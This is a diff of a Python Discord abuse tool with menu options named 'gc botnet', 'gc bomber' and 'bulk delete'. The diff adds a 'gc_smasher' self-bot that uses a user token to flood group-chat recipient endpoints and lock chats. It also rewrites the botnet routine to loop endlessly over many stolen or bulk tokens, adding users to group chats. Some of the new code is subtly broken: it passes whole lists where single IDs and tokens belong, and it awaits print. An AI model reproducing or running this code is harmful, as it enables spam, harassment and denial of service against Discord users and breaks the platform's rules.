@@ -1,8 +1,9 @@
 # -------- Import Modules -------- #
 
-import random, os, sys, json, time, requests
+import random, os, sys, json, time, requests, asyncio
 import discord
 from discord.ext import commands
+from discord.utils import get
 
 # -------- Import Modules -------- #
 
@@ -26,6 +27,9 @@ dashboard_gc_botnet = open('lists/artwork/dashboard_gc_botnet.txt', encoding='ut
 dashboard_add_users = open('lists/artwork/dashboard_add_users.txt', encoding='utf-8').read()
 dashboard_gc_bomber = open('lists/artwork/dashboard_gc_bomber.txt', encoding='utf-8').read()
 dashboard_bulk_delete = open('lists/artwork/dashboard_bulk_delete.txt', encoding='utf-8').read()
+
+dashboard_gc_smasher = open('lists/artwork/dashboard_gc_smasher.txt', encoding='utf-8').read()
+
 
 # -------- Import Artwork -------- #
 
@@ -109,6 +113,9 @@ def startup():
 
       case '11':
         bulk_delete()
+
+      case '12':
+        gc_smasher()
 
       case _:
         startup()
@@ -220,7 +227,6 @@ def afk_check():
 
   except KeyboardInterrupt:
     startup()
-
 
 def afk_alert():
     clear_screen()
@@ -591,37 +597,33 @@ def gc_botnet():
           channel = settings.get('channel')
           token = settings.get('token')
 
-      ids = open('lists/gc_locker/gc_botnet.txt').readlines()
-      tokens = open('lists/gc_locker/gc_tokens.txt').readlines()
+      ids = open('lists/groupchat_lists/gc_botnet/gc_botnet_ids.txt').readlines()
+      tokens = open('lists/groupchat_lists/gc_botnet/gc_botnet_tokens.txt').readlines()
+      while True:
 
-      num_lines = len(ids) # numl
+        for token in tokens:
 
-      i = 0
-      while i < num_lines:
-          user_id = ids[i].strip() 
-          
-          gc_locker_target = f'https://discord.com/api/v9/channels/{channel}/recipients/{user_id}'
-          gc_locker_put_request = requests.put(gc_locker_target, headers={'authorization': token})
+          for id in ids:
+              
+              gc_botnet_target = f'https://discord.com/api/v9/channels/{channel}/recipients/{ids}'
+              gc_botnet_put_request = requests.put(gc_botnet_target, headers={'authorization': tokens})
 
-          match gc_locker_put_request.status_code:
-            case 204:
-              print(f'{front} Added 1 user')
-            
-            case 429:
-              print(f'{front} Being ratelimited')
-            
-            case 401:
-              print(f'{front} Invalid token or group ID')
+              match gc_botnet_put_request.status_code:
+                case 204:
+                  print(f'{front} Added 1 user')
+                
+                case 429:
+                  print(f'{front} Being ratelimited')
+                
+                case 401:
+                  print(f'{front} Invalid token or group ID')
 
-            case 403:
-              print(f'{front} User not added as a friend')
+                case 403:
+                  print(f'{front} User not added as a friend')
 
-            case _:
-              print(f'{front} Unknown status code, report this code to byte#6110 | Code:  {gc_locker_put_request.status_code}')
+                case _:
+                  print(f'{front} Unknown status code, report this code to byte#6110 | Code:  {gc_botnet_put_request.status_code}')
 
-          i += 1
-      input(f'{front} Locker done, press enter to return to main menu.')
-      startup()
 
     except KeyboardInterrupt:
         startup()
@@ -632,7 +634,7 @@ def add_users():
     print(dashboard_add_users)
 
     token = input(f'{front} Token: ')
-    ids = open('lists/gc_locker/gc_botnet.txt').readlines()
+    ids = open('lists/groupchat_lists/gc_botnet/gc_botnet_ids.txt').readlines()
 
     for id in ids:
         add_users_put_url = f'https://discord.com/api/v9/users/@me/relationships/{id.strip()}'
@@ -691,8 +693,8 @@ def gc_bomber():
         channel = settings.get('channel')
         token = settings.get('token')
 
-    ids = open('lists/gc_bomber/gc_bomber_targets.txt').readlines()
-
+    ids = open('lists/groupchat_lists/gc_bomber/gc_bomber_targets.txt').readlines()
+    
     for id in ids:
 
 
@@ -764,8 +766,59 @@ def bulk_delete():
   except KeyboardInterrupt:
     startup()
 
-# -------- Scripts -------- #
+def gc_smasher():
+  try:
+    clear_screen()
+    print(dashboard_gc_smasher)
+    token = settings.get('token')
 
+    DiscordHacks = commands.Bot(description='DiscordHacks', command_prefix=';', self_bot=True)
+
+    DiscordHacks.lockgc = []
+    DiscordHacks.headers = {'authorization': token}
+
+    @DiscordHacks.event
+    async def lockloop():
+        while True:
+            if DiscordHacks.lockgc != []:
+                for gcid in DiscordHacks.lockgc:
+                    response = requests.put(f'https://discordapp.com/api/v8/channels/{gcid}/recipients/1337',headers=DiscordHacks.headers)
+                    if response.status_code == 429:
+                        response_c = response.text
+                        response_content = json.loads(response_c)
+                        lockedsec = response_content.get('retry_after')
+                    else:
+                        headers = {"Authorization": token}
+                        for _ in range(30):
+                            response = requests.put(f'https://discordapp.com/api/v8/channels/{gcid}/recipients/1337',headers=DiscordHacks.headers)
+            await asyncio.sleep(0.8)
+
+    @DiscordHacks.event
+    async def on_connect():
+      print(f"connected to {DiscordHacks.user}, ready to lock groups")
+      await lockloop()
+
+    @DiscordHacks.command()
+    async def lock(ctx, groupid):
+        DiscordHacks.lockgc.extend([groupid] * 1)
+        print(f'locking gc: {groupid}')
+
+    @DiscordHacks.command()
+    async def unlock(ctx, groupid=None):
+        await print('unlocked')
+        if groupid:
+            DiscordHacks.lockgc.pop(groupid)
+            print(f'unlocking {groupid} in 120 seconds')
+        else:
+            DiscordHacks.lockgc.clear()
+            print('unlocked all')
+
+    DiscordHacks.run(token)
+
+  except KeyboardInterrupt:
+    startup()
+
+# -------- Scripts -------- #
 
 # -------- On Start -------- #
 
